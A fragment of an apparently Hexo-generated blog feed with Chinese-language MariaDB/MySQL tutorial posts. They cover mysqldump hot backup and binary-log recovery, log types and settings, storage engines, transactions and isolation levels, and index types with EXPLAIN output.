class="code"><pre><span class="line"><span class="comment">#锁定方法</span></span><br><span class="line">-x,--lock-all-tables：锁定所有库的所有表</span><br><span class="line">-l,--lock-tables：锁定指定数据库的所有表</span><br></pre></td></tr></table></figure><p>对于InnoDB来说，支持热备，但只支持比较小的数据库备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--single-transaction：启动单个巨大事务来备份</span><br><span class="line">--master-data=2：热备的那个一刻，二进制日志处于的位置，并备份出来用CHANGE MASTER TO语句标记，2是备份时候自动注释掉，恢复时候不被执行；</span><br><span class="line">1：记录为CHANGE MASTER TO语句，此语句不被注释；</span><br><span class="line">2：记录为CHANGE MASTER TO语句，此语句被注释；</span><br><span class="line">--flush-logs：锁定表完成后，即进行日志滚动操作，备份时候，重新生成一个二进制日志文件用于备份恢复；</span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#热备hellodb数据库示例，使用mysqldump+二进制日志完成全量+增量备份</span></span><br><span class="line">mysqldump -uroot -pxxx --single-transaction -R -E --triggers  --master-data=2 --flush-logs  --databases hellodb &gt; /root/hellodb-fullback-$(date +%F).sql</span><br><span class="line"><span class="comment">#热备所有数据库</span></span><br><span class="line">mysqldump -uroot -pxxx --single-transaction -R -E --triggers  --master-data=2 --flush-logs  --all-databases  &gt; /root/alldb-fullback-$(date +%F).sql</span><br><span class="line"><span class="comment">#查看二进制日志位置</span></span><br><span class="line">less /root/alldb-fullback-2018-10-24.sql</span><br><span class="line">.......MASTER_LOG_FILE=<span class="string">'master-log.000001'</span>,MASTER_LOG_POS=245;</span><br><span class="line"><span class="comment">#备份恢复</span></span><br><span class="line">cp alldb-fullback-2018-10-24.sql  /tmp/  <span class="comment">#拷贝备份文件</span></span><br><span class="line">cp master-log.000001 /root  <span class="comment">#拷贝二进制日志文件</span></span><br><span class="line">mysqlbinlog master-log.000001  <span class="comment">#读取二进制日志文件</span></span><br><span class="line">mysqlbinlog master-log.000001 &gt; /tmp/binlog.sql  <span class="comment">#把读的结果重定向到指定目录下</span></span><br><span class="line"><span class="comment">#进入数据库</span></span><br><span class="line">mysql </span><br><span class="line"> SET @@session.sql_log_bin=OFF; <span class="comment">#关闭二进制日志</span></span><br><span class="line">\ ./alldb-fullback-2018-10-24.sql <span class="comment">#读取备份文件恢复数据库</span></span><br><span class="line">\ ./binlog.sql <span class="comment">#读取二进制文件生成的备份文件恢复数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line">dump前会滚动二进制日志，这样只需要备份新的二进制日志即可</span><br></pre></td></tr></table></figure><h3 id="物理备份"><a href="#物理备份" class="headerlink" title="物理备份"></a>物理备份</h3><h4 id="xtrabackup"><a href="#xtrabackup" class="headerlink" title="xtrabackup"></a>xtrabackup</h4><p>待完善</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;完全备份：备份整个数据集合&lt;/p&gt;
&lt;p&gt;增量备份：仅备份最近一次完全备份或增量备份以来变化的数据&lt;/p&gt;
&lt;p&gt;差异备份：仅备份最近一次完全备份以来变化的数据&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-日志</title>
    <link href="http://yoursite.com/2020/02/23/mariadb-%E6%97%A5%E5%BF%97/"/>
    <id>http://yoursite.com/2020/02/23/mariadb-%E6%97%A5%E5%BF%97/</id>
    <published>2020-02-23T08:40:25.000Z</published>
    <updated>2020-02-23T08:42:10.223Z</updated>
    
    <content type="html"><![CDATA[<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>查询日志：query log</p><p>慢查询日志：slow query log</p><p>错误日志：error log</p><a id="more"></a><p>二进制日志：binary log</p><p>中继日志：relay log</p><p>事务日志：transaction log</p><h3 id="查询日志"><a href="#查询日志" class="headerlink" title="查询日志"></a>查询日志</h3><p>记录查询操作，可以记录在文件中，也可以记录在数据库表当中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#是否开启查询日志，一般不开启，压力太大</span><br><span class="line">general_log&#x3D;ON|OFF</span><br><span class="line">#以文件为记录时的文件名，一般为主机名</span><br><span class="line">general_log_file&#x3D;HOSTNAME.log</span><br><span class="line">#日志输出格式，可以为文件或表</span><br><span class="line">log_output&#x3D;TABLE|FILE|NONE</span><br></pre></td></tr></table></figure><h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>执行时长超出指定时长的查询操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#查找指定时长变量</span><br><span class="line">show global variables like &#39;long_query_time&#39;;</span><br><span class="line">#可以select来查询该变量</span><br><span class="line">select @@global.long_query_time;</span><br><span class="line"></span><br><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#是否开启慢查询日志</span><br><span class="line">slow_query_log&#x3D;ON|OFF</span><br><span class="line">#慢查询日志存放位置</span><br><span class="line">slow_query_log_file&#x3D;HOSTNAME-slow.log</span><br><span class="line">#慢查询日志记录速率</span><br><span class="line">log_slow_rate_limit&#x3D;1</span><br><span class="line">#慢查询日志记录级别</span><br><span class="line">log_slow_verbosity</span><br><span class="line"></span><br><span class="line">#注意</span><br><span class="line">使用select时，@@表示查询全局变量，@表示查询用户变量</span><br></pre></td></tr></table></figure><h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><p>mysqld启动和关闭过程中输出的事件信息；mysqld运行中产生的错误信息；event scheduler运行一个event时产生的日志信息；在主从复制架构中的从服务器上启动从服务器线程时产生的日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#存放路径</span><br><span class="line">log_error&#x3D;&#x2F;var&#x2F;log&#x2F;mariadb&#x2F;mariadb.log</span><br><span class="line">#是否记录警告信息至错误日志中</span><br><span class="line">log_warning&#x3D;1|0</span><br></pre></td></tr></table></figure><h3 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h3><p>导致数据改变或可能导致数据改变的SQL语句。通过”重放“日志文件中的事件来生成数据副本。</p><p>对于事务表的操作，二进制日志只在事务提交的时候一次性写入(基于事务的innodb二进制日志)，提交前的每个二进制日志记录都先cache，提交时写入。对于非事务表的操作，每次执行完语句就直接写入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#显示已使用的二进制文件日志</span><br><span class="line">show mysql logs;</span><br><span class="line">#查看正在使用中的二进制日志文件</span><br><span class="line">show master status;</span><br><span class="line">#查看日志</span><br><span class="line">show binlog events [in &#39;log_name&#39;] [from pos] [limit [offset,] row_count];</span><br><span class="line"></span><br><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#是否启用二进制日志</span><br><span class="line">log_bin&#x3D;ON|OFF</span><br><span class="line">sql_logbin&#x3D;ON|OFF</span><br><span class="line">#记录文件位置，通常为OFF，使用滚动方式记录</span><br><span class="line">log_bin&#x3D;&#x2F;PATH&#x2F;TO&#x2F;file</span><br><span class="line">#二进制日志格式</span><br><span class="line">binlog_format&#x3D;STATEMENT|ROW|MIXED</span><br><span class="line">#单个二进制文件最大值，默认为1G；到达最大值后会自动滚动</span><br><span class="line">max_binlog_size&#x3D;1073741824</span><br><span class="line">#日志过期时长，0为不启用</span><br><span class="line">expire_logs_days&#x3D;0</span><br><span class="line">#设置是否启用二进制日志同步功能，即事务提交时同步到磁盘</span><br><span class="line">sync_binlog&#x3D;1|0</span><br></pre></td></tr></table></figure><h4 id="记录格式"><a href="#记录格式" class="headerlink" title="记录格式"></a>记录格式</h4><p>基于“语句”记录：statement</p><p>基于“行”记录：row</p><p>混合模式：mixed，让系统自行判定基于哪种方式</p><h4 id="日志构成"><a href="#日志构成" class="headerlink" title="日志构成"></a>日志构成</h4><p>日志文件：mysql-bin.文件名后缀，二进制格式</p><p>索引文件：mysql-bin.index，文本格式，表示哪些二进制日志在使用</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询二进制日志的命令工具</span></span><br><span class="line">mysqlbinlog [option] bin_log_file</span><br><span class="line">--start-position：指定事件起始位置</span><br><span class="line">--stop-position：指定事件结束位置</span><br><span class="line">--start-datetime：指定事件开始时间</span><br><span class="line">--stop-datetime：指定事件结束时间</span><br></pre></td></tr></table></figure><h3 id="中继日志"><a href="#中继日志" class="headerlink" title="中继日志"></a>中继日志</h3><p>复制架构中，从服务器用于保存从主服务器的二进制日志中读取到的事件。</p><h3 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h3><p>帮助事务存储引擎满足ACID测试，由存储引擎自行管理和使用。一般分为redo log和undo log。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#事务日志存放位置</span><br><span class="line">innodb_log_group_home_dir&#x3D;.&#x2F;</span><br><span class="line">#事务日志文件一组有几个</span><br><span class="line">innodb_log_files_in_group&#x3D;2</span><br><span class="line">#每个事务日志文件大小</span><br><span class="line">innodb_log_file_size&#x3D;5242880</span><br></pre></td></tr></table></figure><h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>通常是物理日志，记录的是数据页的物理修改，而不是某一行或某几行修改成怎样，它用来恢复提交后的物理数据页(恢复数据页，且只能恢复到最后一次提交的位置)。</p><p>redo log包括两部分：一是内存中的日志缓冲(redo log buffer)，该部分日志是易失性的；二是磁盘上的重做日志文件(redo log file)，该部分日志是持久的。</p><p>在概念上，innodb通过force log at commit机制实现事务的持久性，即在事务提交的时候，必须先将该事务的所有事务日志写入到磁盘上的redo log file和undo log file中进行持久化。</p><p>执行流程通常是先将原始数据从磁盘中读入内存中来，修改数据的内存拷贝；然后生成一条重做日志并写入redo log buffer，记录的是数据被修改后的值；当事务commit时，将redo log buffer中的内容刷新到 redo log file，对 redo log file采用追加写的方式；最后定期将内存中修改的数据刷新到磁盘中。</p><p>为了确保每次日志都能写入到事务日志文件中，在每次将log buffer中的日志写入日志文件的过程中都会调用一次操作系统的fsync操作(即fsync()系统调用)。因为MariaDB/MySQL是工作在用户空间的，MariaDB/MySQL的log buffer处于用户空间的内存中。要写入到磁盘上的log file中(redo:ib_logfileN文件,undo:share tablespace或.ibd文件)，中间还要经过操作系统内核空间的os buffer，调用fsync()的作用就是将OS buffer中的日志刷到磁盘上的log file中。</p><h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>undo log有两个作用：提供回滚和多个行版本控制(MVCC)。</p><p>在数据修改的时候，不仅记录了redo，还记录了相对应的undo，如果因为某些原因导致事务失败或回滚了，可以借助该undo进行回滚。</p><p>undo log和redo log记录物理日志不一样，它是逻辑日志。可以认为当delete一条记录时，undo log中会记录一条对应的insert记录，反之亦然，当update一条记录时，它记录一条对应相反的update记录。</p><p>当执行rollback时，就可以从undo log中的逻辑记录读取到相应的内容并进行回滚。有时候应用到行版本控制的时候，也是通过undo log来实现的：当读取的某一行被其他事务锁定时，它可以从undo log中分析出该行记录以前的数据是什么，从而提供该行版本信息，让用户实现非锁定一致性读取。</p><p>undo log是采用段(segment)的方式来记录的，每个undo操作在记录的时候占用一个undo log segment。另外，undo log也会产生redo log，因为undo log也要实现持久性保护。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h3&gt;&lt;p&gt;查询日志：query log&lt;/p&gt;
&lt;p&gt;慢查询日志：slow query log&lt;/p&gt;
&lt;p&gt;错误日志：error log&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-存储引擎、事务</title>
    <link href="http://yoursite.com/2020/02/22/mariadb-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%81%E4%BA%8B%E5%8A%A1/"/>
    <id>http://yoursite.com/2020/02/22/mariadb-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%81%E4%BA%8B%E5%8A%A1/</id>
    <published>2020-02-22T11:19:25.000Z</published>
    <updated>2020-02-22T11:21:53.653Z</updated>
    
    <content type="html"><![CDATA[<h3 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>存储引擎是表类型级别的概念，每张表都可以指定使用什么存储引擎。</p><a id="more"></a><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><ul><li><p>用于处理大量短期事务</p></li><li><p>支持行级锁</p></li><li><p>能够实现崩溃后自动恢复</p></li><li><p>数据存储于”表空间”，可以理解为一个建立在文件系统之上的另一个InnoDB专用的文件系统。另外，即使使用一个空的磁盘，且该磁盘不创建文件系统，InnoDB也可以在其上创建表空间进行工作。</p><ul><li>可以将所有的InnoDB表和索引放置于同一个表空间中，但是这样不利于备份且数据混乱。存放于/var/lib/mysql/ibdata1文件中。</li><li>可以每个表单独使用一个表空间存储表的数据和索引，在配置文件的mysqld字段开启：innodb_file_per_table=ON。此时数据文件存放在该表目录下名为tbl_name.idb，表格式文件存放在tbl_name.frm文件中</li></ul></li><li><p>支持MVCC来实现高并发，支持所有的四个隔离级别，默认为REPEATABLE READ；支持间隙锁防止幻读出现</p></li><li><p>使用聚集索引</p></li><li><p>支持“自适应hash索引”、预读操作、插入缓冲区来提高性能</p></li><li><p>支持热备</p></li></ul><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><h5 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h5><ul><li>支持全文索引、压缩表</li><li>不支持事务，不支持行级锁，支持表级锁(容易出现竞争态)</li><li>崩溃后无法正常恢复</li><li>适用于只读(写操作较少)、表较小的数据库</li><li>支持延迟更新索引键</li></ul><h5 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h5><p>tbl_name.frm：表格式定义文件</p><p>tbl_name.MYD：数据文件</p><p>tbl_name.MYI：索引文件</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看存储引擎</span><br><span class="line">show engines;</span><br><span class="line">#查看表状态，可以查看使用什么存储引擎</span><br><span class="line">show table status;</span><br></pre></td></tr></table></figure><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>一组原子性的SQL查询，或者说是一个独立的工作单元，必须满足ACID测试。他们要么全部执行(失败全部回滚)，要么全部不执行，它需要依赖事务日志文件实现崩溃后恢复。</p><h4 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h4><p>A：atomicity，原子性。整个事务中的所有操作要么全部执行，要么全部失败后回滚。</p><p>C：consistency，一致性。数据库总是从一个一致性状态转换为另一个一致性状态。</p><p>I：isolation，隔离性。一个事务所作出的操作在提交之前，是不能为其他所见；隔离有多种级别。</p><p>D：durability，持久性。一旦事务提交，其所做的修改会永久保存于数据库中。</p><h4 id="savepoint"><a href="#savepoint" class="headerlink" title="savepoint"></a>savepoint</h4><p>如果有一系列比较长的操作，但是执行到某一点时执行错了想要回滚，但是如果这时候执行了ROLLBACK那么前面一系列的指令都会全部回滚，效率十分低下。鉴于这种情况，在某条指令后使用savepoint命令创建保存点，那么下次回滚时会回滚到指定保存点的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建保存点</span><br><span class="line">SAVEPOINT point_name;</span><br><span class="line"></span><br><span class="line">#回滚指定保存点</span><br><span class="line">ROLLBACK To point_name;</span><br><span class="line"></span><br><span class="line">#清除保存点</span><br><span class="line">RELEASE SAVEPOINT point_name;</span><br></pre></td></tr></table></figure><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>启动事务：START TRANSACTION</p><p>结束事务：有两种情况；COMMIT提交和ROLLBACK回滚</p><p>注意，默认情况下mysql启动autocommit来实现每个命令自动当作事务进行提交，因此建议关闭autocommit，手动显示请求和提交事务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看是否开启自动提交</span><br><span class="line">show global variables like &#39;%auto%&#39;;</span><br><span class="line">#设置为0，即禁用自动提交</span><br><span class="line">set global autocommit&#x3D;0;</span><br></pre></td></tr></table></figure><h4 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h4><p>隔离级别过高可能会导致阻塞其他事务访问，因此提出隔离级别的概念</p><p>具有四个隔离级别：</p><p>READ-UNCOMMITTED：读未提交，具有脏读、不可重复读、幻读问题</p><p>READ-COMMITTED：读提交，具有不可重复读、幻读问题</p><p>REPEATABLE READ：可重读，默认innodb采用此隔离级别，具有幻读问题</p><p>SERIALIZABILE：可串行化，当前有事务执行时会阻塞其他事务(安全性高，但是几乎无法并行)</p><p>可能存在问题：</p><p>脏读：读到别人没提交的数据，即数据被回滚</p><p>不可重复读：在一次事务中读到不同的数据，即在一次事务中其他人进行了修改</p><p>幻读：为了保证可重读，即使读的数据已被其他人修改，但是在自己的一次事务中仍然认为是原来的样子(即使已经发现被修改，但是为了可重复读必须当作未修改)</p><p>加锁读：要读的数据加锁，别人无法读</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查看访问mysql的进程</span><br><span class="line">show processlist;</span><br><span class="line">#查看隔离相关参数tx_isolation</span><br><span class="line">show global varibles like &#39;%isolat%&#39;</span><br><span class="line">#修改参数tx_isolation为最低等级，可能会出现脏读、幻读、不可重复读</span><br><span class="line">set tx_isolation&#x3D;&#39;READ-UNCOMMITTED&#39;;</span><br></pre></td></tr></table></figure><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>两个或多个事务在同一资源相互占用，并请求锁定对方占用的资源的状态。</p><h4 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h4><p>保证事务能够回滚、持久。每个写操作都先写到事务日志中 (磁盘上的连续空间)，而不是写到数据文件中，因此避免了大量的随机IO。写操作为追加方式，因此其操作为顺序IO。这种日志被称为预写日志。通常该日志在磁盘上有两个，一个写满后写另一个，同时将写满的事务日志进行执行(默认为ib_logfile0|1，大小为5MB)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询日志相关参数，可以修改事务日志文件大小</span><br><span class="line">show global variables like inno%log%&#39;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;存储引擎&quot;&gt;&lt;a href=&quot;#存储引擎&quot; class=&quot;headerlink&quot; title=&quot;存储引擎&quot;&gt;&lt;/a&gt;存储引擎&lt;/h3&gt;&lt;h4 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h4&gt;&lt;p&gt;存储引擎是表类型级别的概念，每张表都可以指定使用什么存储引擎。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
      <category term="存储引擎" scheme="http://yoursite.com/tags/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-索引</title>
    <link href="http://yoursite.com/2020/02/22/mariadb-%E7%B4%A2%E5%BC%95/"/>
    <id>http://yoursite.com/2020/02/22/mariadb-%E7%B4%A2%E5%BC%95/</id>
    <published>2020-02-22T06:12:35.000Z</published>
    <updated>2020-02-22T11:22:03.766Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本法则"><a href="#基本法则" class="headerlink" title="基本法则"></a>基本法则</h3><p>索引应该被构建在经常被用作查询条件的字段上。</p><a id="more"></a><h3 id="相关语句"><a href="#相关语句" class="headerlink" title="相关语句"></a>相关语句</h3><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE  [UNIQUE | FULLTEXT | SPATIAL]  INDEX  索引名 ON  表名(字段名) [USING 索引方法];</span><br><span class="line">#或者</span><br><span class="line">ALTER TABLE 表名 ADD [UNIQUE | FULLTEXT | SPATIAL]  INDEX | KEY  [索引名] (字段名1 [(长度)] [ASC | DESC]) [USING 索引方法]；</span><br></pre></td></tr></table></figure><h4 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看指定表的索引</span><br><span class="line">show index from 表名;</span><br></pre></td></tr></table></figure><h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DROP INDEX 索引名 ON 表名</span><br><span class="line">#或者</span><br><span class="line">ALTER TABLE 表名 DROP INDEX 索引名</span><br></pre></td></tr></table></figure><h3 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a>索引类型</h3><h4 id="B-Tree索引"><a href="#B-Tree索引" class="headerlink" title="B+ Tree索引"></a>B+ Tree索引</h4><p>顺序存储。由于B+树是一颗平衡二叉树，因此每个叶子节点到根节点的距离是相同的。查询时先查找根节点，然后依次往下直到叶子节点，叶子节点存储的是指向数据的指针。并且叶子节点也是顺序存储的，每个叶子节点都指向同级的其他叶子节点，因此找到一个叶子节点后就可以顺序查找到其他的叶子节点，从而也可以顺序存储其他叶子节点的数据。</p><p>由于B+树索引是左前缀索引，因此适合查询范围类的数据：如全键值数据、键值范围或键前缀查找数据等。</p><ul><li>全键值匹配：精确某个值，即完全匹配。</li><li>匹配最左前缀：只精确匹配起头部分。</li><li>匹配范围值：排序后的一个范围的值，只关心<strong>最左列</strong></li><li>精确匹配某一列，并范围匹配另一列：用于多键值匹配</li></ul><p>不适合B+树索引类型：</p><ul><li>不从最左列开始，索引无效。即如果索引是(Age,Name)而查询语句查询的顺序为Name、Age则无法使用索引</li><li>不能跳过索引中的某个列。即如果索引为(StuID,Name,Age)，而查询语句查询的是(StuID,Age)则无法使用索引</li><li>如果查询中某个列是为范围查询，那么其右侧的列都无法再使用索引。即如果索引为(StuID,Name)，此时查询StuID大于10，Name为D开头的。这种情况下即使满足最左侧查询也无法使用索引。</li></ul><h4 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h4><p>将需要索引的列作hash运算，并将其hash结果进行分组存放，即hash结果为1的放在一个hash桶中，以此类推。这种索引方式适合进行精确匹配的查询，不能进行范围匹配。</p><p>该索引方式只在Memory存储引擎中可以使用。</p><h3 id="索引优点"><a href="#索引优点" class="headerlink" title="索引优点"></a>索引优点</h3><ul><li><p>索引可以降低服务需要扫描的数据量，减少IO次数；</p></li><li><p>索引可以帮助服务器避免排序和使用临时表；</p></li><li><p>索引可以帮助将随机IO转为顺序IO</p></li></ul><h3 id="高性能索引策略"><a href="#高性能索引策略" class="headerlink" title="高性能索引策略"></a>高性能索引策略</h3><p>不要让索引列字段参与计算</p><p>左前缀索引，尽量少的使用相同项，即基于左侧多少字符来进行索引创建</p><p>多列索引，通常用于and操作时使用</p><h3 id="EXPLAIN"><a href="#EXPLAIN" class="headerlink" title="EXPLAIN"></a>EXPLAIN</h3><p>可以使用explain语句来分析索引的有效性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#获取查询执行的计划信息，用来查看查询优化器如何执行查询</span><br><span class="line">explain select clause;</span><br><span class="line"></span><br><span class="line">#输出</span><br><span class="line">id：当前查询语句中，每个select语句的编号</span><br><span class="line">select_type：查询类型。</span><br><span class="line">simple：简单查询</span><br><span class="line">复杂查询：</span><br><span class="line">SUBQUERY：简单子查询</span><br><span class="line">DERIVED：用于FROM中的子查询</span><br><span class="line">UNION：UNION语句的第一个之后的SELECT语句</span><br><span class="line">UNION RESULT：UNION语句中的匿名表</span><br><span class="line">table：Select语句关联到的表</span><br><span class="line">type：关联类型，即mysql决定的如何去查询表中的行的方式</span><br><span class="line">ALL：全表扫描</span><br><span class="line">index：根据索引的次序进行全表扫描，可能会产生随机IO</span><br><span class="line">range：有范围限制的根据索引实现的范围扫描</span><br><span class="line">ref：根据索引返回表中匹配某单个值的所有行</span><br><span class="line">eq_ref：仅返回一个行，需要与某个参考值作比较</span><br><span class="line">const，system：直接返回单个行</span><br><span class="line">NULL：没有使用索引</span><br><span class="line">possible_keys：查询可能会用到的索引</span><br><span class="line">key：查询中使用了的索引</span><br><span 